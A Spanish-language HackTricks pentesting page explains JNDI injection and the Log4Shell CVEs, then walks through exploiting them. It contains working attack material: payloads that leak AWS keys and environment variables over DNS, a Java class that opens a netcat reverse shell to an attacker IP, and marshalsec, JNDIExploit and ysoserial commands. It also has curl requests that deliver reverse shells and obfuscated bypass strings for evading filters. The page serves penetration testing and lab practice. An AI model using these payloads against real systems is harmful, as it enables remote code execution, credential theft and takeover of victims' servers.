# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que m√°s importan para que puedas solucionarlas m√°s r√°pido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnol√≥gica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru√©balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Informaci√≥n b√°sica

JNDI ha estado presente en Java desde finales de la d√©cada de 1990. Es un servicio de directorio que **permite a un programa Java encontrar datos a trav√©s de un directorio utilizando un servicio de nombres**. Un servicio de nombres asocia valores (enlaces), por lo que se puede obtener a trav√©s de su referencia en el directorio.

JNDI tiene una serie de **interfaces de proveedor de servicios** (SPI) que le permiten utilizar una variedad de servicios de directorio. El objetivo de JNDI es obtener datos de otros sistemas de manera muy f√°cil. Incluso puedes obtener objetos Java de forma remota, y aqu√≠ es donde surge un problema.

Por ejemplo, existen SPI para el **CORBA COS** (Common Object Service), el **Java RMI** (Remote Method Interface) Registry y **LDAP**.

![](<../../.gitbook/assets/image (627).png>)

### Referencia de nombres de JNDI

Para recuperar objetos Java, podr√≠as serializarlos y guardar su representaci√≥n binaria. Pero hay casos en los que esto no funcionar√° (quiz√°s porque los datos sean demasiado grandes u otra raz√≥n).\
Para guardar objetos Java de manera m√°s f√°cil, se utilizan las **Referencias de Nombres**.\
Existen 2 tipos de Referencias de Nombres:

* **Direcciones de Referencia**: Esto indica la direcci√≥n del objeto (_rmi://servidor/ref_), luego el **objeto se recuperar√° de esa direcci√≥n**.
* **F√°brica Remota**: En este caso, se apuntar√° a una **clase de f√°brica remota** en la referencia de JNDI, luego, siguiendo la direcci√≥n de JNDI, se tomar√° la clase remota de la f√°brica remota y se **descargar√° y cargar√° la clase**.

Esto es peligroso porque los **atacantes pueden hacer que el sistema cargue objetos arbitrarios y ejecute c√≥digo arbitrario**, por lo tanto, existen algunas protecciones:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` de forma predeterminada desde **JDK 7u21**, de lo contrario, permitir√° cargar objetos Java personalizados de forma remota. Adem√°s, incluso si la protecci√≥n est√° desactivada, se aplica un **Administrador de Seguridad** para configurar qu√© se puede cargar.
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` de forma predeterminada desde **JDK** **6u141, 7u131, 8u121**, y no permitir√° ejecutar objetos Java arbitrarios descargados. Pero si se establece en `true`, lo permitir√° y **no se aplicar√° ning√∫n Administrador de Seguridad**.
* **CORBA**: No hay ninguna propiedad que se pueda configurar, pero siempre se aplica el **Administrador de Seguridad**.

Adem√°s, el **Administrador de Nombres**, el que va a seguir los enlaces de JNDI, no tiene ning√∫n Administrador de Seguridad ni propiedad que se pueda configurar, por lo que siempre intentar√° obtener el objeto.

Como puedes ver, las **protecciones en general no son suficientes** porque no hay protecci√≥n contra la carga de JNDI desde direcciones aleatorias y las protecciones de RMI, LDAP y CORBA se pueden eludir (dependiendo de la configuraci√≥n) para cargar objetos Java arbitrarios o cargar objetos Java que abusar√°n de los componentes existentes en la aplicaci√≥n como **gadgets para ejecutar c√≥digo arbitrario**.

Ejemplo de URLs para abusar de JNDI:

* _rmi://servidor-atacante/bar_
* _ldap://servidor-atacante/bar_
* _iiop://servidor-atacante/bar_

### Ejemplo de JNDI

![](<../../.gitbook/assets/image (655) (1) (1).png>)

Incluso si has establecido un **`PROVIDER_URL`**, puedes indicar uno diferente en una b√∫squeda y se acceder√° a √©l: `ctx.lookup("<url-controlada-por-el-atacante>")` y eso es lo que un atacante aprovechar√° para cargar objetos arbitrarios desde un sistema controlado por √©l.
### CORBA

Un **Objeto de Referencia Interoperable (IOR)** es una referencia CORBA o RMI-IIOP que identifica de manera √∫nica un objeto en un servidor CORBA remoto. Los IOR pueden estar en formato binario o en representaci√≥n hexadecimal de la cadena binaria.\
Entre otra informaci√≥n, contiene el **ID de tipo** (un identificador √∫nico para una interfaz) y el **Codebase** (ubicaci√≥n remota utilizada para obtener la clase de stub).\
Tenga en cuenta que **por defecto CORBA no se puede abusar**.\
Requiere:

* Se debe instalar un **Administrador de seguridad**
* La conexi√≥n al **codebase controlado por el atacante debe estar permitida** por el Administrador de seguridad. Hay diferentes formas de permitir esto:
* Permiso de socket: `permissions java.net.SocketPermission "*:1098-1099", "connect";`
* Permiso de archivo que permite leer todos los archivos: `permission java.io.FilePermission "<<ALL FILES>>", "read";`
* Permiso de archivo para leer la carpeta donde el atacante puede cargar los exploits (clases o archivo zip)

Es posible que encuentre **pol√≠ticas de proveedores que permitan esto de forma predeterminada**.

### RMI

Como se indica en la secci√≥n anterior de **Referencia de nombres JNDI, RMI por defecto no permitir√° descargar clases Java arbitrarias**. Y adem√°s, incluso si lo hiciera, deber√° **burlar las pol√≠ticas del Administrador de seguridad** (en la secci√≥n anterior aprendimos que esto era posible con CORBA).

### LDAP

En primer lugar, debemos distinguir entre una B√∫squeda y una Consulta.\
Una **b√∫squeda** utilizar√° una URL como `ldap://localhost:389/o=JNDITutorial` para encontrar el objeto JNDITutorial de un servidor LDAP y **recuperar sus atributos**.\
Una **consulta** est√° destinada a **servicios de nombres** ya que queremos obtener **lo que est√° vinculado a un nombre**.

Si la b√∫squeda LDAP se invoc√≥ con **SearchControls.setReturningObjFlag() con `true`, entonces el objeto devuelto se reconstruir√°**.

Por lo tanto, hay varias formas de atacar estas opciones.\
Un **atacante puede envenenar los registros LDAP introduciendo payloads** en ellos que se ejecutar√°n en los sistemas que los recopilan (muy √∫til para **comprometer decenas de m√°quinas** si se tiene acceso al servidor LDAP). Otra forma de explotar esto ser√≠a realizar un **ataque MitM en una b√∫squeda LDAP**, por ejemplo.

En caso de que pueda **hacer que una aplicaci√≥n resuelva una URL LDAP de JNDI**, puede controlar el LDAP que se buscar√° y podr√≠a enviar de vuelta el exploit (log4shell).

#### Exploit de deserializaci√≥n

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

El **exploit se serializa** y se deserializar√°.\
En caso de que `trustURLCodebase` sea `true`, un atacante puede proporcionar sus propias clases en el codebase; de lo contrario, deber√° abusar de los gadgets en el classpath.

#### Exploit de referencia JNDI

Es m√°s f√°cil atacar este LDAP utilizando **referencias de JavaFactory**:

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Vulnerabilidad Log4Shell

La vulnerabilidad se introduce en Log4j porque admite una [**sintaxis especial**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) en forma de `${prefix:name}` donde `prefix` es uno de varios [**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html) diferentes donde `name` debe evaluarse. Por ejemplo, `${java:version}` es la versi√≥n actual en ejecuci√≥n de Java.

En [**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313) se agreg√≥ un Lookup `jndi` de la siguiente manera: "El JndiLookup permite recuperar variables a trav√©s de JNDI. De forma predeterminada, la clave se prefijar√° con java:comp/env/, sin embargo, si la clave contiene un **":" no se agregar√° ning√∫n prefijo**".

Con un **: presente** en la clave, como en `${jndi:ldap://example.com/a}`, no hay prefijo y se consulta el **servidor LDAP para obtener el objeto**. Y estos Lookups se pueden utilizar tanto en la configuraci√≥n de Log4j como en el registro de l√≠neas.

Por lo tanto, lo √∫nico necesario para obtener RCE es una **versi√≥n vulnerable de Log4j que procese informaci√≥n controlada por el usuario**. Y debido a que esta es una biblioteca ampliamente utilizada por aplicaciones Java para registrar informaci√≥n (incluidas las aplicaciones que est√°n en Internet), era muy com√∫n tener log4j registrando, por ejemplo, encabezados HTTP recibidos como el User-Agent. Sin embargo, log4j **no se utiliza solo para registrar informaci√≥n HTTP, sino cualquier entrada** y datos que el desarrollador indique.

## CVE de Log4Shell

* [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Cr√≠tico]**: La vulnerabilidad original 'Log4Shell' es una falla de [deserializaci√≥n no confiable](https://cwe.mitre.org/data/definitions/502.html). Clasificada como cr√≠tica en gravedad, esta obtiene una puntuaci√≥n de 10 en la escala [CVSS](https://www.first.org/cvss/) y **concede capacidades de ejecuci√≥n remota de c√≥digo (RCE) a atacantes no autenticados**, permitiendo la toma completa del sistema.\
\
Reportada por Chen Zhaojun del Equipo de Seguridad de Alibaba Cloud a Apache el 24 de noviembre, CVE-2021-44228 afecta las configuraciones predeterminadas de varios frameworks de Apache, incluidos Apache Struts2, Apache Solr, Apache Druid, Apache Flink y otros.\
\
Siendo la m√°s peligrosa de todas, esta vulnerabilidad se encuentra en el componente [log4j-core](https://search.maven.org/artifact/org.apache.logging.log4j/log4j-core), limitado a las versiones 2.x: desde 2.0-beta9 hasta 2.14.1 inclusive. Se implement√≥ una soluci√≥n para Log4Shell en la versi√≥n 2.15.0, pero se consider√≥ incompleta (sigue leyendo).\
\
El analista de inteligencia de amenazas Florian Roth comparti√≥ reglas Sigma \[[1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)] que se pueden utilizar como una de las defensas.\\
* [**CVE-2021-45046**](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) \[**Cr√≠tico**, anteriormente Bajo]: Esta es una falla de Denegaci√≥n de Servicio (DoS) que obtiene una puntuaci√≥n de ~~3.7~~ 9.0. La falla surgi√≥ como resultado de una **soluci√≥n incompleta que se implement√≥ en 2.15.0** para CVE-2021-44228. Si bien la soluci√≥n aplicada a 2.15.0 resolvi√≥ en gran medida la falla, ese no fue el caso para ciertas **configuraciones no predeterminadas**.\
\
Log4j 2.15.0 realiza "un intento de mejor esfuerzo" para **restringir las b√∫squedas JNDI LDAP a \_localhost**\_ de forma predeterminada. Sin embargo, los **atacantes** que tienen **control** sobre los datos de entrada del **Mapa de Contexto de Hilo (MDC)** pueden crear payloads maliciosos a trav√©s de los patrones de B√∫squeda JNDI para causar ataques DoS. Esto se aplica a configuraciones no predeterminadas en las que se utiliza un Dise√±o de Patr√≥n no predeterminado que utiliza una B√∫squeda de Contexto, por ejemplo, \$${ctx:loginId}, o un patr√≥n de Mapa de Contexto de Hilo (%X, %mdc o %MDC).\
\
El **bypass tomado de este** [**tweet**](https://twitter.com/marcioalm/status/1471740771581652995) fue:\
_Aqu√≠ hay un PoC de c√≥mo evitar las comprobaciones de allowedLdapHost y allowedClasses en Log4J 2.15.0 para lograr RCE: **`${jndi:ldap://127.0.0.1#evilhost.com:1389/a}`** y para evitar allowedClasses, simplemente elija un nombre para una clase en el JDK. La deserializaci√≥n ocurrir√° como de costumbre._\
\_\_\
\_\_"Log4j 2.16.0 soluciona este problema eliminando el soporte para patrones de b√∫squeda de mensajes y deshabilitando la funcionalidad JNDI de forma predeterminada", afirma el aviso del NVD. Para aquellos en la rama 2.12.1, se ha retroportado una soluci√≥n en la versi√≥n 2.12.2.\\
* [**CVE-2021-4104**](https://nvd.nist.gov/vuln/detail/CVE-2021-4104) **\[Alto]**: ¬øDijimos que las versiones de Log4j 2.x eran vulnerables? ¬øQu√© pasa con **Log4j 1.x**?\
\
Aunque se pensaba que era seguro, Log4Shell encontr√≥ la forma de ocultarse tambi√©n en la versi√≥n anterior de Log4j. B√°sicamente, las instancias de Log4j 1.x que utilizan la clase \_JMSAppender\_\*\* en una configuraci√≥n no predeterminada tambi√©n se vuelven susceptibles a la falla de deserializaci√≥n no confiable\*\*.\
\
Aunque es una variante menos grave de CVE-2021-44228, este CVE afecta a todas las versiones de los componentes [log4j:log4j](https://search.maven.org/artifact/log4j/log4j) y [org.apache.log4j:log4j](https://mvnrepository.com/artifact/org.apache.log4j/log4j) para los cuales solo existen versiones 1.x. Debido a que estas son versiones [fuera de servicio](https://logging.apache.org/log4j/1.2/), **no existe una soluci√≥n para la rama 1.x en ning√∫n lugar**, y se debe actualizar a _log4j-core_ 2.17.0. (Aparentemente, la versi√≥n 1.0 no es vulnerable).\\
* [**CVE-2021-42550**](https://nvd.nist.gov/vuln/detail/CVE-2021-42550) **\[Moderado]:** Esta es una vulnerabilidad en el **framework de registro Logback**. Sucesor de la biblioteca Log4j 1.x, Logback afirma continuar "donde log4j 1.x se queda".\
\
Hasta la semana pasada, Logback tambi√©n [presum√≠a](https://archive.md/QkzIy) que al ser "no relacionado con log4j 2.x, \[logback] no comparte sus vulnerabilidades".\
\
Esa suposici√≥n se desvaneci√≥ r√°pidamente cuando se descubri√≥ que **CVE-2021-4104** tambi√©n afectaba a Log4j 1.x, y se evalu√≥ la posibilidad de un **posible impacto en Logback** [aqu√≠](https://jira.qos.ch/browse/LOGBACK-1591). Se han lanzado nuevas versiones de Logback, 1.3.0-alpha11 y 1.2.9, que abordan esta vulnerabilidad menos grave [aqu√≠](https://search.maven.org/artifact/ch.qos.logback/logback-classic).\\
* **CVE-2021-45105** **\[Alto]**: Se descubri√≥ que **Log4j 2.16.0** es **vulnerable a una falla de DoS** calificada como 'Alta' en gravedad. Apache ha lanzado una versi√≥n log4j 2.17.0 que soluciona el CVE. Se proporcionan m√°s detalles sobre este desarrollo en el [√∫ltimo informe](https://www.bleepingcomputer.com/news/security/upgraded-to-log4j-216-surprise-theres-a-217-fixing-dos/) de BleepingComputer.
* [**CVE-2021-44832**](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/): Este nuevo CVE afecta a la **versi√≥n 2.17** de log4j. Esta vulnerabilidad **requiere que el atacante controle el archivo de configuraci√≥n de log4j**, ya que es posible indicar una URL de JDNI en un JDBCAppender configurado. Para obtener informaci√≥n sobre la **vulnerabilidad y la explotaci√≥n**, [**lea esta informaci√≥n**](https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/).

## Explotaci√≥n de Log4Shell

### Descubrimiento

Esta vulnerabilidad es muy f√°cil de descubrir porque enviar√° al menos una **solicitud DNS** a la direcci√≥n que indiques en tu carga √∫til. Por lo tanto, las cargas √∫tiles como:

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}` (usando [canarytokens.com](https://canarytokens.org/generate))
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}` (usando [interactsh](https://github.com/projectdiscovery/interactsh))
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}` (usando Burp Suite)
* `${jndi:ldap://2j4ayo.dnslog.cn}` (usando [dnslog](http://dnslog.cn))
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}` (usando [huntress](https://log4shell.huntress.com))

Ten en cuenta que **incluso si se recibe una solicitud DNS, eso no significa que la aplicaci√≥n sea explotable** (o incluso vulnerable), deber√°s intentar explotarla.

{% hint style="info" %}
Recuerda que para **explotar la versi√≥n 2.15** necesitas agregar la **bypass de verificaci√≥n de localhost**: ${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **Descubrimiento local**

Busca **versiones locales vulnerables** de la biblioteca con:
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **Verificaci√≥n**

Algunas de las plataformas mencionadas anteriormente te permitir√°n insertar datos variables que se registrar√°n cuando se soliciten.\
Esto puede ser muy √∫til para 2 cosas:

* Para **verificar** la vulnerabilidad
* Para **filtrar informaci√≥n** abusando de la vulnerabilidad

Por ejemplo, podr√≠as solicitar algo como:\
o como `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** y si se recibe una **solicitud DNS con el valor de la variable de entorno**, sabr√°s que la aplicaci√≥n es vulnerable.

Otra informaci√≥n que podr√≠as intentar **filtrar**:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### Informaci√≥n de RCE

{% hint style="info" %}
Los hosts que ejecutan versiones de **JDK superiores a 6u141, 7u131, 8u121 estar√°n protegidos contra el vector de carga de clases LDAP**, **PERO NO contra el vector de deserializaci√≥n**. Esto se debe a que `com.sun.jndi.ldap.object.trustURLCodebase` est√° desactivado de forma predeterminada, por lo que JNDI no puede cargar una base de c√≥digo remota utilizando LDAP. Pero debemos enfatizar que la deserializaci√≥n y las fugas de variables a√∫n son posibles.\
Esto significa que para **explotar las versiones mencionadas**, deber√°s **abusar de alg√∫n gadget confiable** que exista en la aplicaci√≥n Java (usando ysoserial o JNDIExploit, por ejemplo). Pero para explotar versiones inferiores, puedes hacer que carguen y ejecuten clases arbitrarias (lo que facilita el ataque).

Para obtener **m√°s informaci√≥n** (_como limitaciones en los vectores RMI y CORBA_), **consulta la secci√≥n de Referencia de Nombres JNDI anterior** o [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec con carga √∫til personalizada

_Este truco se toma completamente de la **caja THM:**_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)\_\_

Para este exploit, se utilizar√° la herramienta [**marshalsec**](https://github.com/mbechler/marshalsec) (descarga una [**versi√≥n jar desde aqu√≠**](https://github.com/RandomRobbieBF/marshalsec-jar)) para crear un servidor de referencia LDAP que dirija las conexiones a nuestro servidor HTTP secundario donde se servir√° el exploit:
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
Queremos que la v√≠ctima cargue el c√≥digo que nos enviar√° una shell inversa, por lo que puedes crear un archivo java llamado Exploit.java con el siguiente contenido:

{% code title="" %}
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
{% endcode %}

Crea el **archivo de clase** ejecutando: `javac Exploit.java -source 8 -target 8` y luego ejecuta un **servidor HTTP** en el mismo directorio donde se cre√≥ el archivo de clase: `python3 -m http.server`.\
El **servidor LDAP de marshalsec debe apuntar a este servidor HTTP**.\
Luego, puedes hacer que el **servidor web vulnerable ejecute la clase de exploit** enviando un payload como:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
### RCE - **JNDIExploit**

{% hint style="info" %}
Ten en cuenta que si Java no est√° configurado para cargar una base de c√≥digo remota utilizando LDAP, este exploit personalizado no funcionar√°. En ese caso, debes abusar de una clase confiable para ejecutar c√≥digo arbitrario.
{% endhint %}

Para este ejemplo, simplemente ejecuta este **servidor web vulnerable a log4shell** en el puerto 8080: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_en el archivo README encontrar√°s c√≥mo ejecutarlo_). Esta aplicaci√≥n vulnerable est√° registrando con una versi√≥n vulnerable de log4shell el contenido del encabezado de la solicitud HTTP _X-Api-Version_.

Luego, puedes descargar el archivo jar de **JNDIExploit** y ejecutarlo con:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
Despu√©s de leer el c√≥digo durante solo un par de minutos, en _com.feihong.ldap.LdapServer_ y _com.feihong.ldap.HTTPServer_ puedes ver c√≥mo se crean los **servidores LDAP y HTTP**. El servidor LDAP entender√° qu√© carga √∫til debe servir y redirigir√° a la v√≠ctima al servidor HTTP, que ejecutar√° el exploit.\
En _com.feihong.ldap.gadgets_ puedes encontrar **algunos gadgets espec√≠ficos** que se pueden utilizar para ejecutar la acci√≥n deseada (potencialmente ejecutar c√≥digo arbitrario). Y en _com.feihong.ldap.template_ puedes ver las diferentes clases de plantillas que **generar√°n los exploits**.

Puedes ver todos los exploits disponibles con **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**. Algunos √∫tiles son:
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
Entonces, en nuestro ejemplo, ya tenemos esa aplicaci√≥n vulnerable de Docker en ejecuci√≥n. Para atacarla:
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
Al enviar los ataques, ver√°s alguna salida en la terminal donde ejecutaste **JNDIExploit-1.2-SNAPSHOT.jar**.

**Recuerda verificar `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` para otras opciones de explotaci√≥n. Adem√°s, en caso de necesitarlo, puedes cambiar el puerto de los servidores LDAP y HTTP.**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

De manera similar al exploit anterior, puedes intentar utilizar [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) para explotar esta vulnerabilidad.\
Puedes generar las URLs para enviar al objetivo ejecutando:
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_Este ataque utilizando un objeto Java personalizado funcionar√° en laboratorios como la **sala solar de THM**. Sin embargo, esto generalmente no funcionar√° (ya que por defecto Java no est√° configurado para cargar un c√≥digo remoto utilizando LDAP) creo que porque no est√° abusando de una clase confiable para ejecutar c√≥digo arbitrario._

### RCE - ysoserial y JNDI-Exploit-Kit

Esta opci√≥n es realmente √∫til para atacar **versiones de Java configuradas para confiar solo en clases especificadas y no en todos**. Por lo tanto, se utilizar√° **ysoserial** para generar **serializaciones de clases confiables** que se pueden utilizar como gadgets para **ejecutar c√≥digo arbitrario** (_la clase confiable abusada por ysoserial debe ser utilizada por el programa Java v√≠ctima para que el exploit funcione_).

Usando **ysoserial** o [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) puedes crear el exploit de deserializaci√≥n que ser√° descargado por JNDI:
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
Utiliza [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) para generar **enlaces JNDI** donde el exploit estar√° esperando conexiones de las m√°quinas vulnerables. Puedes servir **diferentes exploits que pueden generarse autom√°ticamente** con JNDI-Exploit-Kit o incluso tus **propios payloads de deserializaci√≥n** (generados por ti o por ysoserial).
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

Ahora puedes utilizar f√°cilmente un enlace JNDI generado para explotar la vulnerabilidad y obtener una **shell inversa** simplemente enviando a una versi√≥n vulnerable de log4j: **`${ldap://10.10.14.10:1389/generated}`**

### Bypasses
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ƒ±}}:ldap://...} //Notice the unicode "i"
```
### Esc√°neres autom√°ticos

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Encuentra bibliotecas locales vulnerables

### Laboratorios para probar

* [**M√°quina LogForge HTB**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Explotaci√≥n posterior a Log4Shell

En este [**writeup de CTF**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) se explica bien c√≥mo es **posible** **abusar** de algunas caracter√≠sticas de **Log4J**.

La [**p√°gina de seguridad**](https://logging.apache.org/log4j/2.x/security.html) de Log4j tiene algunas frases interesantes:

> A partir de la versi√≥n 2.16.0 (para Java 8), la **funcionalidad de b√∫squeda de mensajes se ha eliminado por completo**. **Las b√∫squedas en la configuraci√≥n siguen funcionando**. Adem√°s, Log4j ahora deshabilita el acceso a JNDI de forma predeterminada. Las b√∫squedas de JNDI en la configuraci√≥n ahora deben habilitarse expl√≠citamente.

